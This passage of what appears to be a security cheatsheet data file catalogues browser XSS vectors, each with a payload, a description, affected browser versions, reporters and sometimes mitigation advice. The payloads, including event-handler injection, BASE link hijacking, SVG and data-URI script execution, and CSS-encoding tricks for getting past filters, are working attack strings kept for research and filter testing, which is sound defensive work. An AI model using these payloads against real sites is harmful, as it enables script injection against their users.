        'data'       : '<style><img src="</style><img src=x onerror=%js_alert%//">',
        'description': {
            'en' : 'This vector works on all tested user agents and shows how several filtering solutions can be tricked into accepting malicious HTML. A badly written filter will assume the error handler is part of the first image\'s "src" attribute and accept the incoming data.',
            'ja' : '',
            'ru' : 'Этот вектор работает на всех протестированных пользовательких агентах и показывает, как могут быть преодолены некотрые правила фильтрации, запрещающие обработчики событий в качестве атрибутов.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Don\'t rely on weak regular express for markup filtering. Use whitelists for allowed tags and rely on a filter solution based on a heavily tested tokenizer/parser.',
            'ja' : '',
            'ru' : 'Не полагайтесь исключительно на регулярные выражения для фильтрации разметки. Используйте белые списки разрешенных тегов и полагайтесь на фильтры, основанные на хорошо тестированных сигнатурах и анализаторах.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
            'firefox' : ['1.x', '2.x', '3.x'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0'],
            'safari': ['3.0', '4.0']
        },
        'tags'       : ['xss', 'javascript', 'plaintext', 'tags', 'parsing', 'attributes'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 41 - Error handler via empty list-style and load handler via empty content */
        'id'         : 41,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Error handler via empty list-style and load handler via empty content',
            'ja' : '',
            'ru' : 'Свойства content, list-style как способ автоматического исполнения кода',
            'de' : ''
        },
        'data'       : '<li style=list-style:url() onerror=%js_alert%>\n<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=%js_alert%></div>',
        'description': {
            'en' : 'Opera 10.5 and earlier versions fire an error event for <LI> tags in case the background URL via style attribute cannot be loaded. The same works with "list-style-image" too. On Opera 10.10 and earlier more tag/style combinations like background:url() and background-image:url() work as well. Also works combination like content:url(svg).',
            'ja' : '',
            'ru' : 'Opera 10.5 и ниже генерирует событие error для тега <LI> в случае, если URL свойства background не может быть загружен. То же самое действительно для свойства list-style-image. На Opera 10.10 и ниже этот прицип имел универсальный характер, то есть мог быть использован в любом теге. Универсальный характер в Opera 10 и выше имеет комбинация content плюс обработчик onload.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.x', '9.x', '10.x', 'mobile'] 
        },
        'tags'       : ['xss', 'javascript', 'css', 'background', 'opera', 'onerror', 'content'],
        'reporter'   : 'LeverOne, .mario'
    },
    { /* ID 42 - Link hijacking via <BASE> and JavaScript URI  */
        'id'         : 42,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Link hijacking via <BASE> and JavaScript URI',
            'ja' : '',
            'ru' : 'Перехват ссылки с помощью тега <BASE> и псевдоскипта',
            'de' : ''
        },
        'data'       : '<head><base href="javascript://"></head><body><a href="/./,%js_alert%//#">XXX</a></body>',
        'description': {
            'en' : '<BASE> link hijacking with JavaScript URIs works on Internet Explorer, Opera (O8-10.5 in case the link URL starts with #) and Safari. User interaction is required to execute the JavaScript. The vector sometimes has to be changed slightly to work for all mentioned user agents.',
            'ja' : '',
            'ru' : 'Этот вектор работает в Internet Explorer, Opera (O8-10.5 в случае, если URL ссылки начинается с #) и Safari. Для выполнения JavaScript необходимо взаимодействие с пользователем. Вектор иногда приходится слегка изменять для работоспособности во всех заявленных браузерах.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'User submitted HTML should not allow usage of <BASE> tags. In case they are necessary no non-HTTP/non-relative URL schemes should be allowed.',
            'ja' : '',
            'ru' : 'Пользовательская разметка не должна содержать тег <BASE>. Если это возможно, должны быть запрещены все URL, не являющиеся относительными или не начинающиеся с "http://".',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.x', '9.x', '10.x', 'mobile'],
            'safari': ['3.0', '4.0'],
            'internet explorer': ['5.5', '6.0', '7.0', '9.0'] 
        },
        'tags'       : ['xss', 'javascript', 'opera', 'internet explorer', 'base', 'hijacking'],
        'reporter'   : 'brainpillow, Gareth, LeverOne, .mario'
    },
    { /* ID 43 - Opera 10 SVG font XSS  */
        'id'         : 43,
        'category'   : 'font', 
        'name'       : {
            'en' : 'Opera 10 SVG font XSS',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("%svg_front_path%#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>',
        'attachment' : {
            'required_mime' : 'image/svg+xml',
            'samedomain'    : '1',            
            'path'          : 'http://heideri.ch/jso/font.svg',
            'name'          : 'font.svg',
            'raw'           : '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="%js_alert%" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg>'
        },
        'description': {
            'en' : 'Opera 10.00 and later minor versions allow using SVG fonts and will - as soon as the font file has loaded even execute embedded JavaScript. The current example utilizes a load event handler to execute the JavaScript without user interaction as soon as the font file has been fully loaded.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['10.0']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'svg', 'font', 'svgfont'],
        'reporter'   : '.mario'
    },
    { /* ID 44 - Opera @import based XSS inside attribute selectors  */
        'id'         : 44,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Opera @import based XSS inside attribute selectors',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<style>*[{}@import\'%css_path%?]</style>X',
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '0',            
            'path'          : 'http://heideri.ch/jso/test.css',
            'name'          : 'test.css',
            'raw'           : '* {-o-link:\'%js_uri_alert%\';-o-link-source: current;}'
        },
        'description': {
            'en' : 'Opera 10 and later version including latest Opera 10.5 allow breaking out an attribute selector with {} and use @import declarations afterwards. The MIME type for the imported file does not matter - also it can be loaded from arbitrary domains. The imported file contains CSS code to apply a JavaScript URI to all elements on the page to hijack any incoming click.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure in user submitted CSS the contents of attribute selectors are properly escaped with backslashes. Also make sure to use a CSS property:value whitelist to forbid properties like -o-link and -o-link-source.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.0', '9.0', '10.x', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'css', 'hijacking', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 45 -  CSS-string breaking  */
        'id'         : 45,
        'category'   : 'css', 
        'name'       : {
            'en' : 'CSS-string breaking',
            'ja' : '',
            'ru' : 'Разрыв CSS-строки',
            'de' : ''
        },
        'data'       : '<div style="background:url(\'/foo/&#x0A);color:red;\');">XXX',
        'description': {
            'en' : 'Opera, Firefox and other browsers allow breaking out an css-string with newline symbols. A string cannot directly contain a newline in CSS2+.',
            'ja' : '',
            'ru' : 'Оpera, Firefox, а также другие браузеры позволяют прервать css-строку с помощью символов новой строки. Строка не может непосредственно содержать символ новой строки согласно стандартам CSS уровня 2 и выше. Фильтры, которые не учитывают эту особенность, будут неправильно определять опасные свойства стилей.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.0', '9.0', '10.x', 'mobile'],
            'firefox' : ['1.x', '2.x', '3.x'],
            'chrome': ['3.0', '4.0', '5.0', '6.0'],
            'safari': ['3.0', '4.0']
        },
        'tags'       : ['trick', 'opera', 'firefox', 'chrome', 'firefox', 'css'],
        'reporter'   : 'Michal Zalewski'
    },
    { /* ID 46 - Alternative css-syntax in Internet Explorer  */
        'id'         : 46,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Alternative css-syntax in Internet Explorer',
            'ja' : '',
            'ru' : 'Альтернативный css-синтаксис в Internet Explorer',
            'de' : ''
        },
        'data'       : '<div style="font-family:foo}color=red;">XXX',
        'description': {
            'en' : 'Internet Explorer allows to use right curly brace (}) as a group separator. A CSS declaration in quirks mode may consist of a property name, followed by a symbol of equality (=).',
            'ja' : '',
            'ru' : 'Internet Explorer разрешает использовать правую фигурную скобку (}) в качестве группового разделителя. В режиме совместимости css-декларация также может содержать имя свойства, за которым следует знак равенства (=).',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'internet explorer', 'css', 'quirks mode', 'proprietary', 'trick'],
        'reporter'   : 'Gareth, LeverOne, sdc'
    },
    { /* ID 47 - SVG file executing JavaScript via <SCRIPT> tag */
        'id'         : 47,
        'category'   : 'svg', 
        'name'       : {
            'en' : 'SVG file executing JavaScript via <SCRIPT> tag',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
        'description': {
            'en' : 'SVG files can force the user agent to execute JavaScript via plain <SCRIPT> tags inside any SVG element without user interaction',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'SVG files should not be treated as images - especially when coming to uploads. An SVG file can contain arbitrary HTML data as well as event handlers in native elements',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': [
                '10.x'
            ],
            'chrome': [
                '4.0', '5.0', '6.0'
            ],
            'firefox': [
                '3.0', '3.5', '3.6', '3.7'
            ],
            'internet explorer': ['9.0']
        },
        'tags'       : ['xss', 'svg', 'script', 'opera', 'firefox', 'chrome', 'internet explorer'],
        'reporter'   : 'Romain'
    },
    { /* ID 48 - JavaScript execution via <SCRIPT> for and event attributes */
        'id'         : 48,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <SCRIPT> for and event attributes',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<SCRIPT FOR=document EVENT=onreadystatechange>%js_alert%</SCRIPT>',
        'description': {
            'en' : 'Opera and Internet Explorer allow using <SCRIPT> tags with "for" and "event" attributes to bind event data to specific html elements. The two shown attribute values cause script execution without user interaction.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['10.x', 'mobile'],
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'for', 'event', 'internet explorer'],
        'reporter'   : '.mario'
    },
    { /* ID 49 - JavaScript execution via <OBJECT> DataURL attribute */
        'id'         : 49,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <OBJECT> DataURL attribute',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="%js_uri_alert%"></OBJECT>',
        'description': {
            'en' : 'Internet Explorer 9 and - in some situations - earlier versions support the use of JavaScript URIs for the "dataurl" attribute of a TDC Object. The JavaScript will be executed without user any interaction.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms531356%28v=VS.85%29.aspx#Understanding_the_TDC_Object_Model'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'for', 'event', 'internet explorer'],
        'reporter'   : '.mario'
    },
    { /* ID 50 - JavaScript execution via <OBJECT> data */
        'id'         : 50,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <OBJECT> data',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<object data="data:text/html;base64,%js_base64_alert%">',
        'description': {
            'en' : 'Almost all browsers supporting data URIs allow executing JavaScript via crafted <OBJECT> "data" attribute value - even if base64 dencoded.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure user submitted HTML cannot contain <OBJECT> tags or only whitelisted <OBJECT> "data" values.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
            'firefox' : ['1.x', '2.x', '3.x'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0'],
            'safari': ['4.x']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'chrome', 'embed', 'safari', 'src', 'firefox', 'base64'],
        'reporter'   : '.mario'
    },
    { /* ID 51 - JavaScript execution via <EMBED> src */
        'id'         : 51,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <EMBED> src',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<embed src="data:text/html;base64,%js_base64_alert%">',
        'description': {
            'en' : 'Almost all browsers supoorting data URIs allow executing JavaScript via crafted <EMBED> "src" attribute value - even if base64 dencoded. Only Firefox attempts to search for a plugin handler and fails.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure user submitted HTML cannot contain <EMBED> tags or only whitelisted <EMBED> "src" values.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['8.x', '9.x', '10.x', 'mobile'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0'],
            'safari': ['4.x']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'chrome', 'embed', 'safari', 'src', 'base64'],
        'reporter'   : '.mario'
    },
    { /* ID 52 - Internet Explorer Scriptlets executing JavaScript */
        'id'         : 52,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'Internet Explorer Scriptlets executing JavaScript',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<x style="behavior:url(%sct_path%)">',
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '1',            
            'path'          : '',
            'name'          : 'test.sct',
            'raw'           : '<SCRIPTLET>\r\n\t<IMPLEMENTS Type="Behavior"></IMPLEMENTS>\r\n\t<SCRIPT Language="javascript">%js_alert%</SCRIPT>\r\n</SCRIPTLET>'
        },        
        'description': {
            'en' : 'Internet Explorer supports Scriptlets as an alternative binding method for Data Islands. By using the shown examples JavaScript will execute without user interaction.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/aa189871%28office.10%29.aspx', 'http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Users should not be able to either submit CSS or HTML containing style attributes. If necessary make sure the "behavior" property is not whitelisted.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'behavior', 'scriptlet', 'internet explorer', 'style', 'css', 'sct'],
        'reporter'   : '.mario'
    },
    { /* ID 53 - Internet Explorer Data Islands executing JavaScript */
        'id'         : 53,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'Internet Explorer Data Islands executing JavaScript',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<xml id="xss" src="%htc_path%"></xml>\r\n<label dataformatas="html" datasrc="#xss" datafld="payload"></label>',
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '1',            
            'path'          : 'http://heideri.ch/jso/test.htc',
            'name'          : 'test.htc',
            'raw'           : '<?xml version="1.0"?>\r\n<x>\r\n<payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload>\r\n</x>'
        },        
        'description': {
            'en' : 'Internet Explorer supports Data Islands as an XMLish binding method. By using the shown examples JavaScript will execute without user interaction.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms766512%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Users should not be able to submit HTML containing <XML> tags. If necessary make sure the "dataformatas" and "datasrc" attributes are not whitelisted.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'behavior', 'internet explorer', 'style', 'css', 'data island'],
        'reporter'   : '.mario'
    },
    { /* ID 54 - Self-hijacking JSON literals */
        'id'         : 54,
        'category'   : 'json', 
        'name'       : {
            'en' : 'Self-hijacking JSON literals',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<script>[{\'a\':Object.prototype.__defineSetter__(\'b\',function(){alert(arguments[0])}),\'b\':[\'secret\']}]</script>',
        'description': {
            'en' : 'In case parts of a JSON literal are controlled by user input there\'s a risk to allow auto-harvesting values from later object members.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': [
                '10.0', 'mobile'
            ],
            'chrome': [
                '4.0', '5.0', '6.0'
            ],
            'firefox': [
                '1.x', '2.x', '3.0'
            ]
        },
        'tags'       : ['xss', 'javascript', 'json', '__definesetter__', 'object', 'prototype'],
        'reporter'   : '.mario'
    },
    { /* ID 55 - JavaScript execution via <VIDEO> and <SOURCE> tag (1) */
        'id'         : 55,
        'category'   : 'html5', 
        'name'       : {
            'en' : 'JavaScript execution via <VIDEO> and <SOURCE> tag',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<video><source onerror="%js_uri_alert%">',
        'description': {
            'en' : 'Opera 10.5+ and Chrome allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure user submitted <SOURCE> tags cannot contain event handlers or whitelist event handlers necessary for UI controls.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'opera': ['10.5', '10.6'],
            'chrome': ['4.0', '5.0', '6.0']
        },
        'tags'       : ['xss', 'javascript', 'video', 'source', 'html5', 'opera', 'chrome', 'audio'],
        'reporter'   : '.mario'
    },
    { /* ID 56 - JavaScript execution via <VIDEO> and <SOURCE> tag (2) */
        'id'         : 56,
        'category'   : 'html5', 
        'name'       : {
            'en' : 'JavaScript execution via <VIDEO> and <SOURCE> tag',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<video onerror="%js_uri_alert%"><source>',
        'description': {
            'en' : 'Firefox 3.5+ allows error handlers in <VIDEO> tags when applied with a <SOURCE> tag. The same works for <AUDIO> tags',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure user submitted <AUDIO> and <VIDEO> tags cannot contain event handlers or whitelist event handlers necessary for UI controls.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['3.5', '3.6', '3.7']
        },
        'tags'       : ['xss', 'javascript', 'video', 'source', 'html5', 'firefox', 'audio'],
        'reporter'   : '.mario'
    },
    { /* ID 57 - Tags nested in other tags */
        'id'         : 57,
        'category'   : 'html', 
        'name'       : {
            'en' : 'Tags nested in other tags to trick filters',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<b <script>%js_alert%</script>0',
        'description': {
            'en' : 'Chrome, Firefox and Safari will execute JavaScript with this example nesting - while Opera and IE wouldn\'t.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'This vector is ideal to trick regular expression based HTML filters and sanitizers. Make sure your filters are aware of the fact that some user agents evaluate <b <script> while others will prefer <b><script>.',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['3.5', '3.6', '3.7'],
            'chrome': ['4.0', '5.0'],
            'safari': ['3.0', '4.0', '5.0']
        },
        'tags'       : ['xss', 'javascript', 'nesting', 'script', 'parser', 'regex'],
        'reporter'   : '.mario, Kyo, sdc'
    },
    { /* ID 58 - E4X used to close an opening <SCRIPT> tag and create an E4X object at the same time */
        'id'         : 58,
        'category'   : 'e4x', 
        'name'       : {
            'en' : 'E4X used to close an opening <SCRIPT> tag and create an E4X object at the same time',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<b><script<b></b><alert(1)</script </b>',
        'description': {
            'en' : 'This one is tricky. Firefox allows to end an opening <SCRIPT> tag with a new E4X object (<b/>) - already being created in the JavaScript scope at the same time. The alert can happen due to the fact that the additional < introduces a size comparison (<b/> < alert(1)).',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },
        'urls'    : ['https://developer.mozilla.org/en/E4X', 'https://bugzilla.mozilla.org/show_bug.cgi?id=564706'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['1.5', '2.x', '3.x']
        },
        'tags'       : ['xss', 'javascript', 'e4x', 'script', 'parser', 'regex'],
        'reporter'   : '.mario'
    },
    { /* ID 59 - XSS using accent grave when copying innerHTML (1) */
        'id'         : 59,
        'category'   : 'html', 
        'name'       : {
            'en' : 'XSS using accent grave when copying innerHTML (1)',
            'ja' : 'innerHTML\u3092\u30b3\u30d4\u30fc\u3059\u308b\u969b\u306e\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u3092\u4f7f\u3063\u305fXSS',
            'ru' : '',
            'de' : ''
        },
        'data'       : '<div id="div1"><input value="``onmouseover=%js_alert%"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>',
        'description': {
			'en' : 'Internet Explorer treats the accent grave (`) as an attribute delimiter like \" and \'. The quotation mark (") will be stripped from the attribute value when using the innerHTML property in case it doesn\'t contain space.',
            'ja' : 'IE\u306f\u30d0\u30c3\u30af\u30af\u30a9\u30fc\u30c8\u0028\u0060\u0029\u3092 \" \u3084 \' \u306e\u3088\u3046\u306b\u5f15\u7528\u7b26\u3068\u3057\u3066\u6271\u3046\u3002\u307e\u305f\u3001innerHTML\u3092\u53c2\u7167\u3057\u305f\u3068\u304d\u306b\u5c5e\u6027\u5024\u306b\u30b9\u30da\u30fc\u30b9\u304c\u306a\u3051\u308c\u3070\u5f15\u7528\u7b26\u0028\u0022\u0029\u304c\u524a\u9664\u3055\u308c\u308b\u3002',
            'ru' : '',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure the HTML filter you use is aware of the fact that the accent grave is a valid attribute delimiter for IE too - especially if users are allowed to post harmless JavaScript (JSReg, Google Caja).',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': [
                '6.0', '7.0', '8.0'
            ]
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'script', 'dom', 'innerhtml'],
        'reporter'   : 'hasegawayosuke'
    },
    { /* ID 60 - Obfuscation css-properties and values via ignored extra characters */
        'id'         : 60,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Obfuscation css-properties and values via ignored extra characters',
            'ja' : '',
            'ru' : 'Обфускация css-свойств и значений с помощью игнорируемых дополнительных символов',
            'de' : ''
        },
        'data'       : '<div style="[a]color[b]:[c]red">XXX</div>',
        'description': {
            'en' : '[a] Extra characters* ignored before property names (excluding backslash (92))\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nFirefox, Internet Explorer, Opera: 123**\nFirefox 3.x, Internet Explorer: 8\nInternet Explorer: 0-7,11,14-31,33,35-38,40-44,46-47,58,60-64,91,93-96,124-127,160,8192-8203,12288,65279\nInternet Explorer: CSS-strings\n\n[b] Extra characters ignored between property names and colon.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11\nInternet Explorer (quirks mode): 1-8,14-31,33,35-38,40-44,46-47,60,62-64,91,93,94,96,123,124,126,127\nInternet Explorer (quirks mode): CSS-strings, alnum sequences after non-alnum characters (color,foo:red)\n\n[c] Extra characters ignored before values\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11,160,8192-8203,12288,65279\n\n* These are given in decimal codes.\n** Ignored only before first property names.',
            'ja' : '',
            'ru' : '[a] Дополнительные символы*, игнорируемые до имени свойства (за исключением обратного слеша (92))\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nFirefox, Internet Explorer, Opera: 123**\nFirefox 3.x, Internet Explorer: 8\nInternet Explorer: 0-7,11,14-31,33,35-38,40-44,46-47,58,60-64,91,93-96,124-127,160,8192-8203,12288,65279\nInternet Explorer: CSS-строки\n\n[b] Дополнительные символы, игнорируемые между именем свойства и двоеточием.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11\nInternet Explorer (режим совместимости): 1-8,14-31,33,35-38,40-44,46-47,60,62-64,91,93,94,96,123,124,126,127\nInternet Explorer (режим совместимости): CSS-строки, буквенно-цифровые последовательности после небуквенно-цифровых символов (color,foo:red)\n\n[c] Дополнительные символы, игнорируемые перед значениями.\n\nFirefox, Internet Explorer, Safari, Google Chrome, Opera : 9,10,12,13,32\nInternet Explorer: 0,11,160,8192-8203,12288,65279\n\n*Приведены десятичные коды соответствующих символов.\n**Игнорируется только перед первым именем свойства.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['2.x', '3.x'],
            'opera': ['9.x', '10.x', 'mobile'],
            'internet explorer': ['6.0', '7.0', '8.0'],
            'chrome' : ['5.0', '6.0'],
            'safari' : ['4.x', '5.x']
        },
        'tags'       : ['trick', 'css', 'quirks mode', 'obfuscation', 'opera', 'firefox', 'internet explorer', 'chrome', 'safari', 'fuzzing'],
        'reporter'   : 'Gareth, hasegawayosuke, LeverOne, .mario, RSnake, sdc'
    },
    { /* ID 61 - CSS-encoding and backslashing */
        'id'         : 61,
        'category'   : 'css', 
        'name'       : {
            'en' : 'CSS-encoding and backslashing',
            'ja' : '',
            'ru' : 'CSS-кодирование и добавление обратного слеша',
            'de' : ''
        },
        'data'       : '<div style="\\000062\\00065\\68\\0\\00	\\000061 vior:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:\'%js_uri_alert%\';\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-source:current" end=0 onend=%js_alert%>XXX',
        'attachment' : {
            'required_mime' : '',
            'samedomain'    : '1',            
            'path'          : 'http://heideri.ch/jso/test.xbl',
            'name'          : 'test.xbl',
            'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
        },
        'description': {
            'en' : 'There are only three tricks for encoding characters. First, you can change the number of zeros (\\0A -> \\00000A). Secondly, you can change the capital letter (\\0A -> \\0a). Third, you can change the whitespace after the encoded character (\\x20, \\x09 for IE, also \\x0A, \\x0D for FF and Opera). In addition, you can put a backslash before the character (for non-special characters only: \\x = x,\\n != n). In FF You can put a backslash before the newline characters (\\x0A, \\x0D). Properties in IE may contain encoded null-character (\\0). The volume of possible encoding is different in the browsers. For example, FF can not encode parentheses, which is part of the functional notation. Of course, these methods can be combined with other encoding and obfuscation.',
            'ja' : '',
            'ru' : 'Существуют всего три приема, которые можно использовать при css-кодировании. Во-первых, вы можете изменять число нулей (\\0A --> \\00000A), во-вторых, вы можете менять регистр символов (\\0A - \\0a), в-третьих, вы можете менять пробельный символ после закодированного символа (\\x20,\\x09 для IE, а также \\x0A,\\x0D для FF). Кроме того, вы можете добавлять перед символами обратные слеши (если при этом они не становятся специальными: \\x = x, но \\n != n). В FF вы можете эскейпировать символы перевода строки и возврата каретки. В IE свойства могут содержать кодированный нулевой символ (\\0). Важно также помнить, что объем возможного css-кодирования в разных браузерах отличается. Например, в FF не допускается кодировать круглые скобки, выступающие частью функциональной нотации. Разумеется, можно сочетать эти приемы с другим кодированием и обфускацией.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/TR/css3-syntax/#characters', 'http://www.w3.org/TR/CSS2/syndata.html#escaped-characters'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox': ['1.5', '2.x', '3.x'],
            'opera': ['8.x', '9.x', '10.x', 'mobile'],
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'       : ['xss', 'javascript', 'css', 'encoding', 'escape', 'backslash', 'opera', 'firefox', 'internet explorer'],
